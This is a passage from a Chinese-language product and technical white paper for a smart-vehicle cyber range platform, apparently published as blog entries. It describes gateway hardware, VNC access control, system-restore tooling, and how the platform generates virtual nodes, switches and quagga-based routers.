IN/CAN消息，并与靶场虚拟环境中的CAN节点进行数据交换。</p><p>接口适配和数据转换：由于车载网络通信设备与靶场虚拟环境中的CAN节点可能采用不同的物理接口和数据格式，因此需要进行接口适配和数据转换。可以通过使用适配器或转换器来处理不同接口之间的兼容性问题，并将数据进行格式转换，以确保通信的正确性和可靠性。</p><p>socketCAN支持：为实现车载网络通信设备与靶场虚拟环境中的CAN节点的通信，可以利用Linux操作系统的socketCAN机制。通过在车载网络通信设备上配置和使用socketCAN接口，将接入的CAN节点与靶场虚拟环境中的CAN节点进行连接和通信。</p><p>数据传输和协议解析：在通信过程中，车载网络通信设备需要实现数据的传输和协议的解析。可以通过socketCAN接口接收和发送CAN消息，并根据LIN/CAN协议规范进行解析和封装。同时，还需要实现相应的错误检测、纠错和流控等功能，以确保通信的可靠性和稳定性。</p><p>车载网络通信网关具备同时接入4路车载CAN或者LIN总线的能力。</p><p>车载网络通信网关支持1000M、100M车载以太网。</p><p>车载网络通信网关支持DoIP、SOME/IP协议。</p><p>车载网络通信网关具备同时接入4路车载以太网的能力。</p><h3 id="调试桥网关"><a href="#调试桥网关" class="headerlink" title="调试桥网关"></a>调试桥网关</h3><h4 id="功能实施方案-30"><a href="#功能实施方案-30" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>该产品信息如下：</p><p>品牌：国利</p><p>型号：TSB03</p><p>数量：7套</p><p>指标参数信息如下：</p><ol><li>具备多项功能以支持实车无线接口的测试和管理。支持将实车无线接口接入本地或异地联邦靶场进行测试，为用户提供更灵活的测试环境选择。支持对上位机访问权限进行控制，用户可以配置权限，例如桌面浏览、远程键盘输入、远程鼠标输入、复制拷贝文本、文件传输等，以确保安全性和控制范围。支持操作画面监控和录屏功能，方便用户进行实时监控和记录测试过程。提供上位机系统状态的冻结与启动还原功能，确保测试环境的一致性和稳定性。在配置冻结与还原时，需要进行访问控制，以保证数据和系统的安全性。通过这些功能的支持，用户可以更加便捷地管理和测试实车无线接口，提高测试效率和准确性。详细说明见“产品功能截图”部分；</li><li>具备可移动性，方便进行外场测试。可以轻松携带，适用于各种不同的测试场景，并支持快速部署和拆卸。可以随时将它携带到任何地点进行测试和管理，无需担心安装和使用的问题；</li><li>支持ADB和SSH协议的能力。可以与车载的Android系统进行连接，并支持这些协议的数据传输和处理，通过支持ADB和SSH协议，可以更加全面和高级的测试和分析功能，从而保证车辆系统的正常运行和优化；</li></ol><h4 id="性能说明"><a href="#性能说明" class="headerlink" title="性能说明"></a>性能说明</h4><ol><li>提供了2个USB3.0接口和2个USB2.0接口。这些接口可以提供更多的连接和传输方式，从而实现更加全面和高效的测试和分析，对于USB3.0接口，具有更高的传输速度和更稳定的数据传输能力，对于USB2.0接口，虽然传输速度较慢，但是仍然具有广泛的适用性；</li><li>提供了2个以太网调试接口，可以连接到车辆的以太网网络，并通过相关的调试工具进行数据的抓取、分析和调试。这些接口支持高速以太网连接，可以实现快速传输大量的数据，并且提供稳定的连接质量，确保测试人员能够准确地监控和分析车辆通信的各个环节。</li></ol><h4 id="产品功能截图-2"><a href="#产品功能截图-2" class="headerlink" title="产品功能截图"></a>产品功能截图</h4><ul><li>支持将实车无线接口接入本地或异地联邦靶场进行测试；支持从靶场对上位机访问权限控制至少桌面浏览、远程键盘输入、远程鼠标输入、复制拷贝文本、文件传输等权限配置；支持操作画面监控与录屏；支持上位机系统状态冻结与启动还原，冻结与还原配置需要访问控制；</li></ul><p><strong>靶场对上位机的访问权限控制通过VNC Server实现：</strong></p><p>VNC（Virtual Network Computing）是一种远程桌面协议，可以实现远程控制和访问计算机的图形界面。通过使用VNC，在一台计算机上远程控制另一台计算机，并进行桌面浏览、键盘输入、鼠标输入、文件传输等操作。</p><p>在使用VNC时，权限控制可以通过以下方式进行配置：</p><p>VNC服务器设置密码：在VNC服务器上设置密码，只有知道密码的用户才能连接和控制该计算机。</p><p>VNC服务器访问控制：VNC服务器通常提供一些配置选项，可以限制特定IP地址或网络的访问。根据需要配置允许或拒绝的IP地址范围。</p><p>VNC服务器权限配置：某些VNC服务器软件提供更细粒度的权限配置选项，允许您为不同的用户或用户组设置不同的权限级别。这样，控制用户能够执行的操作，例如是否允许复制拷贝文本、文件传输等。</p><p><strong>上位机系统状态冻结与启动还原通过冰点还原实现；</strong></p><p>冰点还原是一种系统管理软件，可以实现系统状态的冻结和启动还原。它可以在计算机重启后恢复系统到事先设定的状态，从而保护系统免受恶意软件、配置更改或其他意外事件的影响。</p><p>使用冰点还原时，系统状态冻结和启动还原的工作流程如下：</p><p>冻结系统状态：在冰点还原软件中，选择将系统状态冻结为一个基准状态。在这个基准状态下，任何对系统的更改（例如安装软件、修改配置、添加文件等）都将被忽略。</p><p>系统运行时状态：在冻结状态下，自由地使用计算机并进行各种操作，例如安装软件、更改配置、存储文件等。这些更改只会在当前会话中生效，并不会对系统的基准状态产生影响。</p><p>启动还原：当您重启计算机时，冰点还原会将系统恢复到冻结状态下的基准状态。任何在冻结状态下进行的更改都会被清除，系统将回到冻结状态所代表的原始状态。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c1020c0cb0d411a72503715a6ee7e82b.png"></p><p>（VNC权限控制界面）</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9ddb7f429c8992c8c17e7f161ced39a7.png"></p><p>（冰点还原）</p><h4 id="技术实现内容-28"><a href="#技术实现内容-28" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>调试桥网关支持多种接口连接方式，包括有线以太网、无线局域网（Wi-Fi）、蜂窝网络（如4G、5G）等、USB接口、OBD诊断接口等。它可以将车辆内部的网络与外部网络进行连接，使车辆能够与互联网进行通信和数据交换。</p><p>调试桥网关使用于外场测试，便携可移动。</p><p>调试桥网关支持ADB/SSH协议。</p><p>调试桥网关配置2个USB3.0接口，2个UBS2.0接口及2个以太网调试接口。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>靶场平台技术白皮书</title>
      <link href="posts/76b713dc/"/>
      <url>posts/76b713dc/</url>
      
        <content type="html"><![CDATA[<p><strong>靶场平台技术白皮书</strong></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f0f87ae178beabba34ab47812799c4cb.png"></p><p>浙江国利网安科技有限公司</p><p>目 录</p><p>1 智能汽车网络靶场目标网络管理分系统 1</p><p>1.1 技术路线 1</p><p>1.1.1 虚拟节点生成模块 1</p><p>1.1.2 目标网络调度模块 19</p><p>1.1.3 目标网络管理模块 25</p><p>1.1.4 虚实互联管理模块 29</p><p>1.1.5 虚拟网络支撑模块 35</p><p>1.1.6 流量仿真模块 47</p><p>2 智能汽车网络靶场试验支撑分系统 63</p><p>2.1 技术路线 63</p><p>2.1.1 人员管理模块 63</p><p>2.1.2 资源管理模块 66</p><p>2.1.3 运维管理模块 89</p><p>3 智能汽车网络靶场试验配置管理分系统 94</p><p>3.1.1 汽车安全测试模块 94</p><p>3.1.2 汽车安全演练模块 129</p><p>3.1.3 汽车安全众测模块 136</p><p>3.1.4 试验场景设置模块 139</p><p>3.1.5 试验导调模块 152</p><p>3.1.6 网络安全攻防与汽车测评教学培训模块 158</p><p>3.1.7 网络安全攻防与汽车测评竞赛模块 170</p><p>4 智能汽车网络靶场数据采集分系统 178</p><p>4.1 技术路线 178</p><p>4.1.1 节点状态采集模块 178</p><p>4.1.2 网络链路采集模块 183</p><p>4.1.3 多元网络安全知识库模块 190</p><p>4.1.4 复杂攻击知识匹配流计算模块 198</p><p>4.1.5 多模态网络仿真数据库模块 203</p><p>4.1.6 靶场信息库模块 209</p><p>4.1.7 试验数据库模块 214</p><p>5 智能汽车网络靶场态势分析分系统 233</p><p>5.1 项目技术路线 233</p><p>5.1.1 系统架构 233</p><p>5.1.2 态势分析控制管理模块 234</p><p>5.1.3 网络安全场景知识图谱模块 255</p><p>5.1.4 攻击检测研判模块 296</p><p>5.1.5 态势可视化展示模块 314</p><p>5.1.6 安全分析评估模块 342</p><p>5.1.7 资产漏洞探测模块 356</p><p>5.1.8 安全事件检测模块 367</p><p>5.1.9 安全数据融合 377</p><h1 id="智能汽车网络靶场目标网络管理分系统"><a href="#智能汽车网络靶场目标网络管理分系统" class="headerlink" title="智能汽车网络靶场目标网络管理分系统"></a>智能汽车网络靶场目标网络管理分系统</h1><h2 id="技术路线"><a href="#技术路线" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="虚拟节点生成模块"><a href="#虚拟节点生成模块" class="headerlink" title="虚拟节点生成模块"></a>虚拟节点生成模块</h3><h4 id="功能实施方案"><a href="#功能实施方案" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>1）系统内的常规IT设备虚拟化功能覆盖了包括服务器节点、客户端节点、二层交换、三层交换、动态路由及各类虚拟安全设备节点在内的广泛网络设备类型。此功能实现通过高级虚拟化技术，模拟各类网络设备的核心功能和网络行为。系统中对于网络和安全设备的虚拟化，涵盖了路由器、防火墙、入侵检测系统（IDS）、Web应用防火墙（WAF）等设备。这些虚拟设备不仅重现了实体设备的操作特性和性能指标，而且能够模拟复杂的网络拓扑结构和流量模式，实现高度真实的网络环境模拟。</p><p>本系统为用户提供了一个仿真环境，用于生成和管理包括服务器节点、客户端节点、二层交换节点、三层交换节点、动态路由节点及各类虚拟安全设备节点在内的常规IT设备虚拟化服务。该仿真环境可以模拟多种不同功能类型的节点，从而满足用户对于复杂网络构建和安全测试的需求。</p><p>此仿真环境支持包括路由器、防火墙、入侵检测系统（IDS）、Web应用防火墙（WAF）在内的常见网络和安全设备的虚拟化和配置。仿真环境内的这些虚拟化设备能提供与实体设备相似的网络安全功能和网络管理功能，用户通过仿真操作可以在无需实物设备的情况下测试网络设计方案和安全防护策略。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/58293eaf24089c2a16399f4b8f92ac80.png" alt="1703330319004"></p><p>不同功能类型节点</p><p>2）提供的目标网络管理系统设计了一套先进的虚拟节点生成机制，能够根据实际需求生成各种类型的虚拟节点，包括但不限于X86架构虚拟节点、ARM架构（包括ARM32和ARM64）虚拟节点以及容器节点。这不仅满足了测试或演练的需求，还为用户提供了一个高度逼真的模拟环境，让他们能够更准确地评估和应对潜在的安全风险。目标网络管理系统还支持不少于10个车型、100个智能网联零部件的虚拟化生成。这一功能可以在一个统一的平台上进行各种测试或演练，而无需担心资源和时间的限制。提供的目标网络管理系统在同一二层网络中支持三种虚拟化节点的共存。可以在一个真实的网络环境中模拟和测试各种不同类型节点的交互和行为，从而更准确地评估网络的整体性能和安全性。这一功能为用户提供了更大的灵活性，让他们能够根据实际需求进行各种复杂的测试或演练。在车联网控制器虚拟节点方面，目标网络管理系统提供了Linux控制器和Android控制器两种类型，以满足不同操作系统和控制需求。无论是基于Linux系统的控制器还是基于Android系统的控制器，能够提供稳定、高效的支持，确保测试或演练的顺利进行，目标网络管理系统还包含了汽车智能网联业务管理平台和内容分发服务平台等车联网业务平台，能够用于车联网业务管理平台的测试。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/65e05a2a15b138857c46097a85322926.png"></p><p>支持X86虚拟节点、ARM虚拟节点、容器节点</p><h4 id="性能实施方案"><a href="#性能实施方案" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><p>1）系统设计具备高扩展性，能够创建大于1400个独立的虚拟节点，以支持大规模网络仿真。系统通过优化的资源分配和虚拟化技术实现该指标参数，确保在创建大量节点的情况下，系统的性能和响应速度仍然保持稳定。</p><p>2）系统能在10分钟内迅速部署高达1000个虚拟节点。通过系统高效资源管理和快速部署机制，大幅提高网络部署的效率，缩短项目启动时间，增强整体测试流程的敏捷性。</p><p>3）系统采用预设模板技术，实现快速构建新网络拓扑，能在2秒内根据模版完成虚拟节点的生成和拓扑的构建，显著减少网络配置所需时间。系统通过模板化常见网络配置，实现快速克隆和部署，提高测试环境的构建速度和灵活性。</p><p>4）模块支持多样化的节点类型，包括车载信息娱乐系统（车机）、远程信息处理终端（TBOX）、网络网关、服务器、客户端、二层交换机、三层交换机、动态路由器、公网路由器以及网络安全组件防火墙等10种以上的节点类型。支持节点多样性使系统能够实现复杂网络环境的仿真能力，满足不同测试场景的需求，为用户在多变的网络环境中提供有效的测试环境和评估工具。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1bbb306c6af71873ba055959402a9efb.png" alt="1703330571401"></p><p>10种以上的节点类型</p><h4 id="技术实现内容"><a href="#技术实现内容" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>功能参数设计方面，系统提供广泛的虚拟化能力，能够生成多种类型的虚拟节点，包括服务器节点、客户端节点、二层交换、三层交换、动态路由以及虚拟安全设备节点。此外，系统还支持多种网络和安全设备的模拟，如路由器、防火墙、IDS、WAF等，为用户提供了全面的仿真环境。</p><p>针对汽车信息安全领域，系统的虚拟节点生成功能非常强大。它可以同时生成不同车型和智能网联零部件的虚拟节点，包括X86架构虚拟节点、ARM架构虚拟节点（ARM32和ARM64）以及容器节点。这些节点能够在同一二层网络中协同运行，提供了更真实和复杂的测试场景。系统还支持多种车联网控制器虚拟节点类型，如Linux控制器和Android（安卓）控制器，以及车联网业务平台，如汽车智能网联业务管理平台和内容分发服务平台，满足不同用例的需求。</p><p>性能参数设计方面，系统具备高度扩展性。它能够支持1400个以上虚拟节点的生成，确保用户在仿真测试中拥有足够的资源。1000个虚拟节点的最小创建时间不超过10分钟，保证了测试过程的高效性。此外，系统支持通过模板生成新的网络拓扑，生成时间迅速，不超过2秒，提升了用户的操作效率。系统还提供了多达10种不同类型的仿真节点，涵盖了车机、TBOX、网关、服务器、客户端、二层交换机、三层交换机、动态路由、公网路由和防火墙，满足了各种复杂测试场景的要求。这些性能参数的设计确保了系统能够高效地应对大规模仿真和测试的挑战。</p><p>虚拟节点生成模块会根据测试配置管理的资源需求,向基础设施申请所需的虚拟计算资源,然后使用这些资源生成各类虚拟节点,如虚拟机、容器、网络设备等。</p><p>它可以生成虚拟机节点、轻量级容器节点、虚拟网络设备和虚拟安全设备等多类型虚拟节点。这为构建联邦的虚拟靶场提供了关键的虚拟化支持。</p><p>测试人员可以通过测试配置管理向其提出资源需求,它会自动化生成对应类型和规格的虚拟节点。大大简化了虚拟环境的部署配置,可以专注于测试业务本身。</p><p>这样通过虚拟技术模拟各类网络功能与设备,在保障测试需求的同时,也提高了资源利用效率,降低了靶场建设成本。</p><p>虚拟化软件支持现有市场上主要国内外操作系统，包括Windows、CentOS、Fedora、RedHat、SUSE、Ubuntu。基于KVM开发，虚拟化软件兼容OpenStack Pike等主流版本。虚拟设备基于KVM开发，虚拟化软件兼容OpenStack Pike等主流版本。</p><p>虚拟节点支持ARM架构虚拟机、X86架构虚拟机、容器的混合生成，并且在同一二层网络中支持三种虚拟化节点的共存是通过合理的网络设计和配置来实现的。</p><p>系统支持提供VPC网络、经典网络、弹性IP、负载均衡、防火墙、安全组、云解析DNS、NAT网关、QoS等网络服务；可查看VPC网络的ID/名称、状态、IPv4 CIDR、IPv6 CIDR、私有网络、防火墙、外部网关、私网域名、组织等信息。</p><p>支持CPU隔离技术，将指定的CPU从主机的多核平衡调度策略中移除；CPU被隔离后，系统不会自动把任务放到隔离的CPU上运行，隔离的CPU专用于虚拟机CPU绑定的物理CPU、DPDK绑定的物理CPU，以避免出现主机CPU一直处于忙碌状态，而一些重要业务的虚拟机或者主机启用DPDK功能时获取主机CPU资源过慢的情况，影响业务的处理速度。</p><p>结合云管理平台和服务器虚拟化平台，可实现层次化端口绑定功能，可有效突破4K可用VLAN的限制。</p><p>虚拟化主机空载时的CPU利用率小于5%；虚拟化主机空载时的内存利用率&lt;5%。</p><h5 id="虚拟交换机"><a href="#虚拟交换机" class="headerlink" title="虚拟交换机"></a>虚拟交换机</h5><p>在信息化技术不断发展的状况下，虚拟化网络逐渐呈现出巨大的发展潜力。相较于传统的交换机，虚拟交换机在许多方面存在优势，因此，在未来通信行业中虚拟交换机技术的应用势在必行。</p><p>虚拟交换机原理：根据拓扑结构可知，虚拟交换机技术的原理相对简单，就本质而言，该项技术就是在逻辑上集成多台物理连接的交换机。该项技术的特点在于通信的可靠性更强，工作效率也得到了提升，系统的带宽容量也得以增加。与传统交换机相比，虚拟交换机不仅可以使STP、VRRP协议运行要求的负载均衡与冗余得以实现。</p><p>在物理环境之中，主机是通过pSwitch连接到网络当中。而在虚拟化环境中，则使用 vswitch。虚拟机通过vSwitch来连接网络，vSwitch是通过主机上的物理网卡作为上行链路与外界网络进行连接。</p><p>跟普通服务器设备一样，每个虚拟机有着自己的虚拟网卡(virtual NIC），每个 virtual NIC有着自己的MAC地址和IP地址。 Virtual Switch(vSwitch）相当于一个虚拟的二层交换机，该交换机连接虚拟网卡和物理网卡，将虚拟机上的数据报文从物理网口转发出去。与物理交换机一样，vSwitch的作用就是用来转发数据。</p><p>虚拟节点支持ARM架构虚拟机、X86架构虚拟机、容器的混合生成，并且在同一二层网络中支持三种虚拟化节点的共存是通过合理的网络设计和配置来实现的，如下所示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/049aef1376681cce862068a72fe000c4.jpeg" alt="D:\\1.CyberSecurity\\文档修改\\六所靶场\\工业互联网安全开发测试基础共性服务平台项目场景导调与模拟仿真系统\\431521-20171224101134818-1527791519.jpg"></p><p>虚拟交换机原理</p><p>每个vSwitch都有两种接口，上联口和下联口。上联口用来连接物理网卡，每个上联口绑定一个物理网卡。一个vSwitch至少要有一个上联口，多个上联口可以进行捆绑。上联口可以配置IP地址，方便进行管理操作。下联口用于连接虚拟机，每个下联口连接一台虚拟机。与物理交换机不同的是，vSwitch下联口不会自动学习MAC地址，都是静态绑定的。上联口的IP和虚拟机的IP没有必然的关系，可以配置为不同的网段。</p><p>虚拟交换机支持二层交换机和三层交换机镜像。模拟仿真系统支持VLAN、VXLAN两种组网模式，支持租户之间地址重叠。</p><p>支持绘制仿真二层交换机，配置的参数包括交换机基础信息，名称、图标类型（系统默认、自定义）、所属势力方、自定义描述内容、自定义属性；网络信息，名称、所属网络、所属设备、传递设备、子网个数、状态（是否允许设备间传递）等信息；子网信息，子网名称、所属网络、所属Vlan、所属设备以及子网基本信息CIDR、网关、DNS等信息。</p><p>支持绘制仿真三层交换机，配置的参数包括交换机基础信息，名称、图标类型（系统默认、自定义）、所属势力方、自定义描述内容、自定义属性；网络信息，名称、所属网络、所属设备、传递设备、子网个数、状态（是否允许设备间传递）等信息；子网信息，子网名称、所属网络、所属Vlan、所属设备以及子网基本信息CIDR、网关、DNS等信息；可设置虚拟网络访问外部网络并支持指定IP。</p><p>网络策略模板：是对下联口和虚拟机的一些操作，可以对下联口进行出入方向的流量进行限制，规划下联口所属VLAN，设置VSI和应用ACL策略。缺省情况下，没有对下联口进行流控，端口所属VLAN为0（即数据包不带VLAN Tag）。</p><p>虚拟交换机内置DHCP服务器，支持为连接到该虚拟交换机的虚拟机分配IP地址、子网掩码、默认网关、DNS地址等网络参数，支持以图形化的方式展示DHCP地址池的IP地址分配情况。</p><p>网络拓扑构建功能可实现层次化端口绑定功能，可有效突破4K可用VLAN的限制。</p><h6 id="使用vswitch构建虚拟网络"><a href="#使用vswitch构建虚拟网络" class="headerlink" title="使用vswitch构建虚拟网络"></a>使用vswitch构建虚拟网络</h6><p>构建物理机和物理机相互连接的网络：在安装vswitch的主机上有两块网卡，分别为eth0、eth1，把这两块网卡挂接到vswitch的网桥上，然后有两台物理机host1、host2分别连接到eth0和eth1上，实现这两台物理机的通信，构建结果如所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c3971583a9e786ecefacf2effd82472f.jpeg" alt="https://img1.sdnlab.com/wp-content/uploads/2015/12/OVS%E5%88%9D%E7%BA%A7%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8open%20vswitch%E6%9E%84%E5%BB%BA%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%20%E5%9B%BE2.jpeg"></p><p>物理机和物理机相互连接</p><h6 id="构建虚拟机与虚拟机相连的网络"><a href="#构建虚拟机与虚拟机相连的网络" class="headerlink" title="构建虚拟机与虚拟机相连的网络"></a>构建虚拟机与虚拟机相连的网络</h6><p>在安装vswitch的主机上安装两个虚拟机，把两个虚拟机的网卡都挂接在vswitch的网桥上，实现两台虚拟机的通信，构建结果所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/70762e7cbac3ae78c074bc4c55889bae.jpeg" alt="https://img1.sdnlab.com/wp-content/uploads/2015/12/OVS%E5%88%9D%E7%BA%A7%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8open%20vswitch%E6%9E%84%E5%BB%BA%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%20%E5%9B%BE3.jpeg"></p><p>虚拟机相连</p><h6 id="构建虚拟机与物理机相连的网络"><a href="#构建虚拟机与物理机相连的网络" class="headerlink" title="构建虚拟机与物理机相连的网络"></a>构建虚拟机与物理机相连的网络</h6><p>在装有vswitch的主机上有一个物理网卡eth0，一台主机通过网线和eth0相连，在open vswitch的主机上还装有一台虚拟机，把此虚拟机和连接到eth0的主机挂接到同一个网桥上，实现两者之间的通信，构建结果如所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ce85e18e5fd34462b725c94e5140f608.jpeg" alt="https://img1.sdnlab.com/wp-content/uploads/2015/12/OVS%E5%88%9D%E7%BA%A7%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8open%20vswitch%E6%9E%84%E5%BB%BA%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%20%E5%9B%BE4.jpeg"></p><p>虚拟机物理机相连</p><p>构建网桥和网桥相连的网络：以上操作都是将多个主机（物理机或虚拟机）连接到同一个网桥上，实现它们之间的通信，但是要构建复杂的网络，就需要多个网桥，在装有vswitch的主机上建立两个网桥，实现它们之间的连接，构建结果如所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/da3477d3e80e491d0767f48900385af4.jpeg" alt="https://img1.sdnlab.com/wp-content/uploads/2015/12/OVS%E5%88%9D%E7%BA%A7%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8open%20vswitch%E6%9E%84%E5%BB%BA%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%20%E5%9B%BE5.jpeg"></p><p>网桥相连</p><h6 id="在不同的主机之间构建网桥之间的连接"><a href="#在不同的主机之间构建网桥之间的连接" class="headerlink" title="在不同的主机之间构建网桥之间的连接"></a>在不同的主机之间构建网桥之间的连接</h6><p>在两台机器上分别安装上vswitch并创建网桥，分别为两个网桥添加物理网卡，然后通过网线连接两个网桥，实现两个网桥之间的互通。构建结果如所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a190fd44b77fa16b3e67a8d34e7de76f.jpeg" alt="https://img1.sdnlab.com/wp-content/uploads/2015/12/OVS%E5%88%9D%E7%BA%A7%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8open%20vswitch%E6%9E%84%E5%BB%BA%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%20%E5%9B%BE6.jpeg"></p><p>两台机器网桥创建</p><p>使用上边五种方法的组合就可以构建出各种复杂的网络，为各种实验提供网络的支持。</p><p>ACL策略：与物理交换机的有些不同，在功能上有一定的限制。ACL策略能对流量进行基于目的IP的包过滤，因为下联口只有一台虚拟机，所以根本不需要基于源IP的规则。ACL支持基于ICMP、TCP和UDP协议进行操作。ACL策略应用于下联口的入方向。</p><p>网络策略模板：是对下联口和虚拟机的一些操作，可以对下联口进行出入方向的流量进行限制，规划下联口所属VLAN，设置VSI和应用ACL策略。缺省情况下，没有对下联口进行流控，端口所属VLAN为0（即数据包不带VLAN Tag）。</p><p>虚拟交换机内置DHCP服务器，支持为连接到该虚拟交换机的虚拟机分配IP地址、子网掩码、默认网关、DNS地址等网络参数，支持以图形化的方式展示DHCP地址池的IP地址分配情况。</p><h5 id="虚拟路由器"><a href="#虚拟路由器" class="headerlink" title="虚拟路由器"></a>虚拟路由器</h5><p>虚拟路由器即Virtual Router，是指在软、硬件层实现物理路由器的功能仿真，属于一种逻辑设备。它在软件中复制基于硬件的第3层Internet协议（IP）路由的功能。虚拟路由是网络功能虚拟化(NFV）的一种形式，它将传统的基于硬件的网络设备的功能转换为软件，而不是在标准的商用现货(COTS）硬件上运行。这样能够降低硬件成本，并且有助于实现硬件互操作性，且无需专用硬件平台。</p><h6 id="虚拟路由器特性"><a href="#虚拟路由器特性" class="headerlink" title="虚拟路由器特性"></a>虚拟路由器特性</h6><p>由于虚拟路由将IP路由功能从特定的硬件中释放出来，路由功能可以更自由地在网络或数据中心周围移动。在基本的软件路由功能中，路由软件被添加到商品服务器中，使该硬件成为路由器。在更复杂的分布式路由环境中，路由软件的各个部分可以在整个网络中移动，同时使用集中控制平面进行管理。</p><p>提供一个自动化的路由器配置接口，以实现对路由器的动态配置和管理。通过此接口，可以进行静态路由配置，包括目的网络、下一跳信息和出接口等。还可以配置各种动态路由协议，如RIP、OSPF、BGP、IS-IS、IGRP等，通过设置相关参数来实现动态路由功能。另外，可以设置优先级，以确定路由选择的顺序和权重，确保网络流量的优化。同时，接口还支持包过滤设置，允许或阻止特定类型的数据包通过路由器，实现对流量的控制。最后，拥塞控制功能也可以通过接口进行配置，以确保在高负载情况下路由器能够进行流量管理和调控。通过提供这样的自动化配置接口，路由器的管理和调整变得更加方便和灵活，满足不同网络环境和需求的路由器配置要求。也可支持DNS、NAT网关、QoS等网络服务。可查看VPC网络的ID/名称、状态、IPv4 CIDR、IPv6 CIDR、私有网络、防火墙、外部网关、私网域名、组织等信息。</p><p>每个虚拟路由器应该具有逻辑独立的路由表和转发表，这样就使不同VPN间的地址空间可以重用，并保证了VPN内部路由和转发的隔离性。虚拟路由器具备以下特征：</p><p>高度仿真：进入系统后，应当具备与真实路由器相同的外观，相同的命令录入界面和相同的输出提示等，使学生通过练习熟悉后，将来即使第一次接触真实路由器也能够正确配置与使用。</p><p>满足实验室的特征：该系统应当具备练习模块和考试模块，学生通过自己的学号和密码登陆后，进入练习模块做实验，界面有实验目的、实验要求、练习中有操作提示等，完成后记录；进入考试模块，根据要求完成实验考试，完成后记录成绩；教师有专用管理模块，可以查看学生的练习和考试情况。</p><p>具备分布特征：该系统可使学生在规定的时间内在不同的地点完成自己应当做的练习和考试，由于采用D E 0 模式，学生用户和教师用户都不需要维护该系统，只要保证网络畅通即可。</p><p>虚拟路由器关键性能：支持对租户虚拟路由器进行管理，包括接口/子网、外部网络、路由信息、BGP对等体等进行管理。</p><h6 id="虚拟路由器安装"><a href="#虚拟路由器安装" class="headerlink" title="虚拟路由器安装"></a>虚拟路由器安装</h6><p>全虚拟化路由器:全虚拟化路由器基于KVM虚拟机为原型，通过搭载quagga实现路由功能，并重新打包成虚拟路由器镜像。基于该虚拟路由器镜像，可以登录到路由器系统，通过查看配置手册，根据当前网络场景手动配置动态路由协议实现云计算中逼真的三层网络拓扑。同时，通过python设计了基于OSPF协议的可自动部署程序，能够使得该虚拟路由器镜像启动后可自行探测接口信息，并调用配置接口完成路由协议的自动部署。经过典型网络场景测试，该路由器能够在IPv4协议下完成多路由器节点间的动态、静态路由支持。</p><p>1.在搭建成功的openstack平台中，启动一台虚拟机，配置floating ip，使其能够上网，然后安装quagga软件。</p><p>安装过程和简单使用： <img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/3ee81f008743a6a6537ae6fd7a4bec50.png"></p><p>安装流程1</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/19c5185f935f9984f775a378294e27de.png"></p><p>安装流程2</p><p>完成以上步骤可以手动配置协议。</p><p>2.编写自动配置代码：</p><p>代码结构如下：实现了基于OSPF协议的自动部署虚拟路由器。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a2b967d11a47f04af7821504a91039b7.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/53398176f00ce80c551ab5413908ca55.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c57a6852e089cf5038941276f0e77c0a.png"></p><p>编写自动配置代码</p><p>3.编写Web服务，提供远程查询路由表服务：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" 